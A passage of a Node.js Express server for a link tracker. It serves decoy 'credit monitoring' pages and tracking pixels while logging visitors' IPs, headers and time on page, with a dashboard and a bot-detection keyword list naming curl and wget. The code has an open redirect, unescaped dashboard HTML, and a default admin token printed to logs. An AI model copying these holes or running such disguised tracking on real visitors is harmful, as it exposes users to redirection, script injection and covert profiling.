0; setInterval(() => { timeOnPage += 10; if (timeOnPage % 30 === 0) { fetch("/api/js-track/' + trackingId + '", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ action: "time_on_page", seconds: timeOnPage, timestamp: new Date().toISOString() }) }).catch(() => {}); } }, 10000);</script></body></html>';
}

// Extract tracking logic to reusable function
function handleTracking(req, res, trackingId) {
    const clientInfo = extractClientInfo(req);
    
    if (trackingData.has(trackingId)) {
        trackingData.get(trackingId).clicks.push(clientInfo);
        console.log('Bot interaction: ' + clientInfo.ip + ' - ' + clientInfo.userAgent);
    } else {
        console.log('Unknown tracking ID accessed: ' + trackingId);
    }
    
    saveInteraction(trackingId, clientInfo);
    
    const strategy = req.query.strategy || 'resume';
    
    switch (strategy) {
        case 'redirect':
            res.redirect(req.query.target || 'https://example.com');
            break;
            
        case 'pixel':
            res.set({
                'Content-Type': 'image/png',
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Pragma': 'no-cache',
                'Expires': '0'
            });
            const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64');
            res.send(pixel);
            break;
            
        case 'resume':
        case 'credit':
        default:
            res.send(generateCreditMonitoringHTML(trackingId));
            break;
    }
}

// Friendly URL endpoints
app.get('/offer/:friendlyPath', (req, res) => {
    const friendlyPath = req.params.friendlyPath;
    const trackingId = findTrackingIdByPath(friendlyPath);
    
    if (trackingId) {
        handleTracking(req, res, trackingId);
    } else {
        res.status(404).send('Offer not found');
    }
});

app.get('/go/:friendlyPath', (req, res) => {
    const friendlyPath = req.params.friendlyPath;
    const trackingId = findTrackingIdByPath(friendlyPath);
    
    if (trackingId) {
        handleTracking(req, res, trackingId);
    } else {
        res.status(404).send('Link not found');
    }
});

app.get('/promo/:promoCode', (req, res) => {
    const promoCode = req.params.promoCode;
    const trackingId = findTrackingIdByPromo(promoCode) || 'promo-' + promoCode + '-' + Date.now();
    handleTracking(req, res, trackingId);
});

// Main tracking endpoint
app.get('/t/:id', (req, res) => {
    const trackingId = req.params.id;
    handleTracking(req, res, trackingId);
});

// JavaScript-based tracking endpoint
app.post('/api/js-track/:id', (req, res) => {
    const trackingId = req.params.id;
    const jsInfo = {
        timestamp: new Date().toISOString(),
        ip: getClientIP(req),
        type: 'javascript',
        data: req.body
    };
    
    if (trackingData.has(trackingId)) {
        trackingData.get(trackingId).clicks.push(jsInfo);
    }
    
    saveInteraction(trackingId, jsInfo);
    res.json({ success: true });
});

// Extract comprehensive client information
function extractClientInfo(req) {
    const ip = getClientIP(req);
    
    return {
        timestamp: new Date().toISOString(),
        ip: ip,
        userAgent: req.headers['user-agent'] || 'Unknown',
        referer: req.headers['referer'] || 'Direct',
        acceptLanguage: req.headers['accept-language'] || 'Unknown',
        acceptEncoding: req.headers['accept-encoding'] || 'Unknown',
        host: req.headers['host'],
        method: req.method,
        url: req.url,
        query: req.query,
        xForwardedFor: req.headers['x-forwarded-for'],
        xRealIp: req.headers['x-real-ip'],
        cfConnectingIp: req.headers['cf-connecting-ip'],
        isBot: detectBot(req.headers['user-agent'] || ''),
        botScore: calculateBotScore(req.headers)
    };
}

// Enhanced bot detection
function detectBot(userAgent) {
    const botKeywords = [
        'bot', 'crawler', 'spider', 'scraper', 'automated',
        'python', 'curl', 'wget', 'requests', 'selenium',
        'headless', 'phantom', 'zombie', 'mechanize'
    ];
    
    const ua = userAgent.toLowerCase();
    return botKeywords.some(keyword => ua.includes(keyword));
}

// Calculate bot probability score
function calculateBotScore(headers) {
    let score = 0;
    
    if (!headers['accept-language']) score += 20;
    if (!headers['accept-encoding']) score += 15;
    if (!headers['accept']) score += 10;
    
    const ua = (headers['user-agent'] || '').toLowerCase();
    if (ua.includes('python')) score += 30;
    if (ua.includes('curl')) score += 30;
    if (ua.includes('wget')) score += 30;
    if (ua === '') score += 25;
    
    if (headers['accept'] && headers['accept'].includes('*/*') && !headers['accept-language']) {
        score += 15;
    }
    
    return Math.min(score, 100);
}

// Save interaction to persistent log
function saveInteraction(trackingId, clientInfo) {
    const logEntry = {
        trackingId: trackingId,
        ip: clientInfo.ip,
        userAgent: clientInfo.userAgent,
        timestamp: clientInfo.timestamp,
        isBot: clientInfo.isBot,
        botScore: clientInfo.botScore
    };
    
    const logFile = path.join(__dirname, 'interactions.log');
    const logLine = JSON.stringify(logEntry) + '\n';
    
    fs.appendFile(logFile, logLine, (err) => {
        if (err) console.error('Failed to write log:', err);
    });
}

// Get tracking statistics
app.get('/api/stats/:id', requireAuth, (req, res) => {
    const trackingId = req.params.id;
    
    if (!trackingData.has(trackingId)) {
        return res.status(404).json({ error: 'Tracking ID not found' });
    }
    
    const data = trackingData.get(trackingId);
    const clicks = data.clicks || [];
    
    // Get last 50 clicks for detailed view
    const recentClicks = clicks.slice(-50).map(click => ({
        timestamp: click.timestamp,
        ip: click.ip,
        userAgent: click.userAgent || 'Unknown',
        referer: click.referer || 'Direct',
        acceptLanguage: click.acceptLanguage || 'Unknown',
        isBot: click.isBot || false,
        botScore: click.botScore || 0,
        type: click.type || 'page_visit'
    }));
    
    // Calculate top user agents
    const uaMap = {};
    clicks.forEach(click => {
        const ua = click.userAgent || 'Unknown';
        uaMap[ua] = (uaMap[ua] || 0) + 1;
    });
    
    const topUserAgents = Object.entries(uaMap)
        .sort(([,a], [,b]) => b - a)
        .slice(0, 10)
        .map(([ua, count]) => ({
            userAgent: ua.length > 60 ? ua.substring(0, 60) + '...' : ua,
            count: count
        }));
    
    res.json({
        trackingId: trackingId,
        created: data.created,
        description: data.description,
        campaign: data.campaign,
        totalClicks: clicks.length,
        uniqueIPs: [...new Set(clicks.map(c => c.ip))].length,
        botClicks: clicks.filter(c => c.isBot).length,
        humanClicks: clicks.filter(c => !c.isBot).length,
        avgBotScore: clicks.length > 0 ? 
            Math.round(clicks.reduce((sum, c) => sum + (c.botScore || 0), 0) / clicks.length) : 0,
        recentClicks: recentClicks,
        topUserAgents: topUserAgents,
        lastClick: clicks.length > 0 ? clicks[clicks.length - 1].timestamp : null
    });
});

// Helper functions for analytics
function getTopUserAgents(clicks) {
    const uaMap = {};
    clicks.forEach(click => {
        const ua = click.userAgent || 'Unknown';
        uaMap[ua] = (uaMap[ua] || 0) + 1;
    });
    
    return Object.entries(uaMap)
        .sort(([,a], [,b]) => b - a)
        .slice(0, 5)
        .map(([ua, count]) => ({userAgent: ua, count: count}));
}

function getClicksByHour(clicks) {
    const hourMap = {};
    clicks.forEach(click => {
        const hour = new Date(click.timestamp).getHours();
        hourMap[hour] = (hourMap[hour] || 0) + 1;
    });
    
    return hourMap;
}

// Get all tracking data
app.get('/api/dashboard', requireAuth, (req, res) => {
    const allStats = Array.from(trackingData.entries()).map(([id, data]) => {
        const clicks = data.clicks || [];
        const recentClicks = clicks.slice(-20);
        
        return {
            trackingId: id,
            shortId: id.substring(0, 8),
            created: data.created,
            description: data.description,
            campaign: data.campaign,
            friendlyPath: data.friendlyPath,
            urlType: data.urlType,
            totalClicks: clicks.length,
            uniqueIPs: [...new Set(clicks.map(c => c.ip))].length,
            botClicks: clicks.filter(c => c.isBot).length,
            humanClicks: clicks.filter(c => !c.isBot).length,
            lastClick: clicks.length > 0 ? clicks[clicks.length - 1].timestamp : null,
            recentClicks: recentClicks,
            avgBotScore: clicks.length > 0 ? 
                Math.round(clicks.reduce((sum, c) => sum + (c.botScore || 0), 0) / clicks.length) : 0
        };
    });
    
    const totalClicks = allStats.reduce((sum, s) => sum + s.totalClicks, 0);
    const totalBots = allStats.reduce((sum, s) => sum + s.botClicks, 0);
    
    res.json({
        totalLinks: allStats.length,
        totalClicks: totalClicks,
        totalBots: totalBots,
        totalHumans: totalClicks - totalBots,
        botPercentage: totalClicks > 0 ? Math.round((totalBots / totalClicks) * 100) : 0,
        links: allStats.sort((a, b) => new Date(b.created) - new Date(a.created))
    });
});

// Simple dashboard with comprehensive analytics
app.get('/dashboard', (req, res) => {
    res.send('<!DOCTYPE html><html><head><title>ResumeBoost Pro - Analytics Dashboard</title><style>body { font-family: Arial, sans-serif; margin: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; } .container { max-width: 1200px; margin: 0 auto; background: white; margin: 20px; border-radius: 10px; box-shadow: 0 20px 60px rgba(0,0,0,0.1); padding: 30px; } h1 { color: #667eea; text-align: center; margin-bottom: 10px; } .auth { margin: 20px 0; padding: 20px; background: #f8f9ff; border-radius: 10px; border: 2px solid #e0e6ff; } input, select { width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #e0e6ff; border-radius: 8px; box-sizing: border-box; } button { background: #667eea; color: white; padding: 12px 24px; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; } .hidden { display: none; } .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; } .stat { background: linear-gradient(135deg, #667eea, #764ba2); color: white; padding: 20px; border-radius: 10px; text-align: center; } .stat h3 { margin: 0; font-size: 2.5em; } .error { color: #ef4444; } .success { color: #10b981; } .tabs { display: flex; border-bottom: 2px solid #e0e6ff; margin: 20px 0; } .tab { padding: 10px 20px; cursor: pointer; border-bottom: 2px solid transparent; } .tab.active { border-bottom-color: #667eea; color: #667eea; font-weight: bold; } .tab:hover { background: #f8f9ff; } .campaign-card { background: #fff; border: 2px solid #e0e6ff; border-radius: 10px; margin: 15px 0; overflow: hidden; } .campaign-header { background: #f8f9ff; padding: 15px; border-bottom: 1px solid #e0e6ff; cursor: pointer; } .campaign-header:hover { background: #f0f4ff; } .campaign-title { font-weight: bold; color: #667eea; font-size: 1.1em; } .campaign-details { padding: 20px; display: none; background: #fafafa; } .campaign-details.show { display: block; } .visitor-table { width: 100%; border-collapse: collapse; margin: 15px 0; font-size: 0.9em; } .visitor-table th, .visitor-table td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; } .visitor-table th { background: #667eea; color: white; } .visitor-table tr:hover { background: #f5f5f5; } .bot-badge { padding: 2px 6px; border-radius: 4px; font-size: 0.8em; font-weight: bold; } .bot-badge.bot { background: #fef2f2; color: #dc2626; } .bot-badge.human { background: #f0fdf4; color: #059669; } .ip-address { font-family: monospace; color: #667eea; } .user-agent { font-family: monospace; font-size: 0.8em; max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }</style></head><body><div class="container"><h1>📊 ResumeBoost Pro</h1><p style="text-align: center; color: #666;">Analytics Dashboard - Detailed Campaign Analytics</p><div class="auth"><h3>🔐 Authentication Required</h3><input type="password" id="token" placeholder="Enter admin token"><button onclick="authenticate()">Connect to Dashboard</button><button onclick="refreshData()" id="refreshBtn" style="margin-left: 10px; background: #10b981; display: none;">Refresh</button><div id="status"></div></div><div id="dashboard" class="hidden"><div class="stats"><div class="stat"><h3 id="totalLinks">0</h3><p>Campaign Links</p></div><div class="stat"><h3 id="totalClicks">0</h3><p>Total Visits</p></div><div class="stat"><h3 id="totalBots">0</h3><p>Bot Detections</p></div><div class="stat"><h3 id="botPercentage">0%</h3><p>Bot Rate</p></div></div><div class="tabs"><div class="tab active" onclick="showTab(this, \\"create\\")">🔗 Create Campaign</div><div class="tab" onclick="showTab(this, \\"analytics\\")">📈 Campaign Analytics</div></div><div id="createTab"><div style="background: #f8f9ff; padding: 20px; border-radius: 10px; margin: 20px 0;"><h3>🔗 Create New Campaign Link</h3><input type="text" id="description" placeholder="Campaign description (e.g., Email Newsletter)"><input type="text" id="campaign" placeholder="Campaign name (e.g., Q1-2024)"><select id="urlType"><option value="friendly">Friendly URL</option><option value="promo">Promo Code</option><option value="company">Company Application</option><option value="tool">Tool URL</option></select><input type="text" id="customPath" placeholder="Custom path (optional)"><button onclick="createLink()">Generate Tracking Link</button><div id="result"></div></div></div><div id="analyticsTab" class="hidden"><h3>📊 Campaign Analytics & Visitor Details</h3><div id="campaignsList">Loading campaigns...</div></div></div></div><script>let token = ""; let dashboardData = {}; function authenticate() { token = document.getElementById("token").value; fetch("/api/dashboard", { headers: { "Authorization": "Bearer " + token } }).then(r => r.ok ? r.json() : Promise.reject("Invalid token")).then(data => { document.getElementById("status").innerHTML = "<span class=\\"success\\">✅ Connected!</span>"; document.getElementById("dashboard").classList.remove("hidden"); document.getElementById("refreshBtn").style.display = "inline-block"; updateDashboard(data); }).catch(e => document.getElementById("status").innerHTML = "<span class=\\"error\\">❌ " + e + "</span>"); } function refreshData() { if (!token) return; fetch("/api/dashboard", { headers: { "Authorization": "Bearer " + token } }).then(r => r.json()).then(data => updateDashboard(data)); } function updateDashboard(data) { dashboardData = data; document.getElementById("totalLinks").textContent = data.totalLinks; document.getElementById("totalClicks").textContent = data.totalClicks; document.getElementById("totalBots").textContent = data.totalBots; document.getElementById("botPercentage").textContent = data.botPercentage + "%"; updateCampaignsList(data.links); } function updateCampaignsList(links) { const container = document.getElementById("campaignsList"); if (links.length === 0) { container.innerHTML = "<p style=\\"text-align: center; color: #666; padding: 20px;\\">No campaigns created yet.</p>"; return; } container.innerHTML = links.map(link => { return "<div class=\\"campaign-card\\"><div class=\\"campaign-header\\" onclick=\\"toggleCampaign(\'" + link.trackingId + "\')\\\"><div class=\\"campaign-title\\">" + link.description + "</div><div style=\\"color: #666; font-size: 0.9em; margin-top: 5px;\\">Campaign: " + link.campaign + " • Created: " + new Date(link.created).toLocaleDateString() + " • ID: " + link.shortId + "</div><div style=\\"display: grid; grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); gap: 10px; margin-top: 10px;\\"><div style=\\"background: #e8f0ff; padding: 8px; border-radius: 5px; text-align: center;\\"><div style=\\"font-weight: bold; color: #667eea;\\">" + link.totalClicks + "</div><div style=\\"font-size: 0.8em;\\">Total Clicks</div></div><div style=\\"background: #e8f0ff; padding: 8px; border-radius: 5px; text-align: center;\\"><div style=\\"font-weight: bold; color: #667eea;\\">" + link.uniqueIPs + "</div><div style=\\"font-size: 0.8em;\\">Unique IPs</div></div><div style=\\"background: #e8f0ff; padding: 8px; border-radius: 5px; text-align: center;\\"><div style=\\"font-weight: bold; color: #667eea;\\">" + link.humanClicks + "</div><div style=\\"font-size: 0.8em;\\">Human Clicks</div></div><div style=\\"background: #e8f0ff; padding: 8px; border-radius: 5px; text-align: center;\\"><div style=\\"font-weight: bold; color: #667eea;\\">" + link.botClicks + "</div><div style=\\"font-size: 0.8em;\\">Bot Clicks</div></div></div></div><div class=\\"campaign-details\\" id=\\"details-" + link.trackingId + "\\"><div id=\\"clicks-" + link.trackingId + "\\">Loading detailed analytics...</div></div></div>"; }).join(""); } function toggleCampaign(trackingId) { const details = document.getElementById("details-" + trackingId); const clicksContainer = document.getElementById("clicks-" + trackingId); if (details.classList.contains("show")) { details.classList.remove("show"); } else { details.classList.add("show"); loadCampaignDetails(trackingId, clicksContainer); } } function loadCampaignDetails(trackingId, container) { console.log("Loading details for:", trackingId); container.innerHTML = "<p>Loading visitor details...</p>"; fetch("/api/stats/" + trackingId, { headers: { "Authorization": "Bearer " + token } }).then(r => { console.log("Response status:", r.status); if (!r.ok) { throw new Error("HTTP " + r.status + ": " + r.statusText); } return r.json(); }).then(data => { console.log("Received data:", data); const clicks = data.recentClicks || []; if (clicks.length === 0) { container.innerHTML = "<div style=\\"text-align: center; padding: 20px; background: #f8f9ff; border-radius: 8px; margin: 10px 0;\\"><h4>📭 No Visitors Yet</h4><p style=\\"color: #666;\\">This campaign hasn\\'t received any clicks yet.<br>Share the tracking link to start collecting data!</p><p style=\\"font-family: monospace; font-size: 0.9em; color: #667eea;\\">Campaign ID: " + trackingId.substring(0, 8) + "</p></div>"; return; } const clicksTable = "<div style=\\"margin: 15px 0;\\"><h4 style=\\"color: #667eea; margin-bottom: 15px;\\">📋 Visitor Log (" + clicks.length + " recent visits)</h4><div style=\\"overflow-x: auto;\\"><table class=\\"visitor-table\\"><thead><tr><th>Date & Time</th><th>IP Address</th><th>User Agent</th><th>Location Info</th><th>Bot Detection</th><th>Bot Score</th><th>Type</th></tr></thead><tbody>" + clicks.map(click => { const date = new Date(click.timestamp); const timeStr = date.toLocaleDateString() + "<br><small>" + date.toLocaleTimeString() + "</small>"; const userAgentShort = click.userAgent.length > 50 ? click.userAgent.substring(0, 50) + "..." : click.userAgent; return "<tr><td>" + timeStr + "</td><td class=\\"ip-address\\">" + click.ip + "</td><td class=\\"user-agent\\" title=\\"" + click.userAgent + "\\">" + userAgentShort + "</td><td><strong>" + (click.acceptLanguage || "Unknown") + "</strong><br><small style=\\"color: #666;\\">" + (click.referer !== "Direct" ? "Ref: " + click.referer : "Direct access") + "</small></td><td><span class=\\"bot-badge " + (click.isBot ? "bot" : "human") + "\\">" + (click.isBot ? "🤖 Bot" : "👤 Human") + "</span></td><td><strong style=\\"color: " + (click.botScore > 50 ? "#dc2626" : "#059669") + ";\\">" + (click.botScore || 0) + "%</strong></td><td>" + (click.type === "javascript" ? "📱 JS" : "🌐 Page") + "</td></tr>"; }).join("") + "</tbody></table></div></div>"; const userAgentsSection = data.topUserAgents && data.topUserAgents.length > 0 ? "<div style=\\"margin: 20px 0;\\"><h4 style=\\"color: #667eea; margin-bottom: 15px;\\">📊 Top User Agents</h4><div style=\\"background: #f8f9ff; padding: 15px; border-radius: 8px; border: 1px solid #e0e6ff;\\">" + data.topUserAgents.map(ua => "<div style=\\"display: flex; justify-content: space-between; align-items: center; margin: 8px 0; padding: 5px; background: white; border-radius: 4px;\\"><span style=\\"font-family: monospace; font-size: 0.85em; color: #333; flex: 1;\\">" + ua.userAgent + "</span><span style=\\"font-weight: bold; color: #667eea; margin-left: 10px;\\">" + ua.count + " visits</span></div>").join("") + "</div></div>" : ""; const summarySection = "<div style=\\"background: #e8f0ff; padding: 15px; border-radius: 8px; margin: 15px 0; border-left: 4px solid #667eea;\\"><h4 style=\\"margin: 0 0 10px 0; color: #667eea;\\">📈 Campaign Summary</h4><div style=\\"display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 15px;\\"><div><strong>Total Visits:</strong><br><span style=\\"font-size: 1.2em; color: #667eea;\\">" + data.totalClicks + "</span></div><div><strong>Unique IPs:</strong><br><span style=\\"font-size: 1.2em; color: #667eea;\\">" + data.uniqueIPs + "</span></div><div><strong>Human Visits:</strong><br><span style=\\"font-size: 1.2em; color: #059669;\\">" + data.humanClicks + "</span></div><div><strong>Bot Visits:</strong><br><span style=\\"font-size: 1.2em; color: #dc2626;\\">" + data.botClicks + "</span></div><div><strong>Avg Bot Score:</strong><br><span style=\\"font-size: 1.2em; color: " + (data.avgBotScore > 50 ? "#dc2626" : "#059669") + ";\\">" + data.avgBotScore + "%</span></div></div></div>"; container.innerHTML = summarySection + clicksTable + userAgentsSection; }).catch(e => { console.error("Error loading campaign details:", e); container.innerHTML = "<div style=\\"color: #ef4444; background: #fef2f2; padding: 15px; border-radius: 8px; margin: 10px 0;\\"><h4>❌ Error Loading Details</h4><p>Failed to load visitor details: " + e.message + "</p><p><strong>Tracking ID:</strong> " + trackingId + "</p><button onclick=\\"loadCampaignDetails(\\'" + trackingId + "\\', document.getElementById(\\'clicks-" + trackingId + "\\'));\\" style=\\"background: #667eea; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; margin-top: 10px;\\">🔄 Retry</button></div>"; }); } function showTab(tabElement, tabName) { document.querySelectorAll(".tab").forEach(tab => tab.classList.remove("active")); tabElement.classList.add("active"); document.getElementById("createTab").classList.toggle("hidden", tabName !== "create"); document.getElementById("analyticsTab").classList.toggle("hidden", tabName !== "analytics"); if (tabName === "analytics" && token) { refreshData(); } } function createLink() { const desc = document.getElementById("description").value; const camp = document.getElementById("campaign").value; const urlType = document.getElementById("urlType").value; const customPath = document.getElementById("customPath").value; fetch("/api/create-link", { method: "POST", headers: { "Authorization": "Bearer " + token, "Content-Type": "application/json" }, body: JSON.stringify({ description: desc, campaign: camp, urlType: urlType, customPath: customPath }) }).then(r => r.json()).then(data => { if (data.success) { document.getElementById("result").innerHTML = "<div style=\\"background: #e8f0ff; padding: 15px; border-radius: 8px; margin: 10px 0;\\"><strong>✅ Campaign link created!</strong><br><strong>Main URL:</strong> <span style=\\"font-family: monospace; color: #667eea; word-break: break-all;\\">" + data.url + "</span><br><strong>Short URL:</strong> <span style=\\"font-family: monospace; color: #667eea; word-break: break-all;\\">" + data.shortUrl + "</span></div>"; document.getElementById("description").value = ""; document.getElementById("campaign").value = ""; document.getElementById("customPath").value = ""; setTimeout(refreshData, 1000); } }); } setInterval(() => { if (token && !document.getElementById("analyticsTab").classList.contains("hidden")) { refreshData(); } }, 30000);</script></body></html>');
});

// Error handling
app.use((error, req, res, next) => {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
});

// 404 handler
app.use((req, res) => {
    res.status(404).json({ error: 'Not found' });
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('Saving data before shutdown...');
    const dataObj = Object.fromEntries(trackingData);
    fs.writeFileSync(DATA_FILE, JSON.stringify(dataObj, null, 2));
    process.exit(0);
});

app.listen(PORT, () => {
    console.log('RentNStarter Credit running on port ' + PORT);
    console.log('Available at: https://rentnstarter.up.railway.app');
    console.log('Dashboard: https://rentnstarter.up.railway.app/dashboard');
    console.log('Admin token: ' + (process.env.ADMIN_TOKEN || 'admin-secret-token'));
    console.log('Total tracking links: ' + trackingData.size);
});
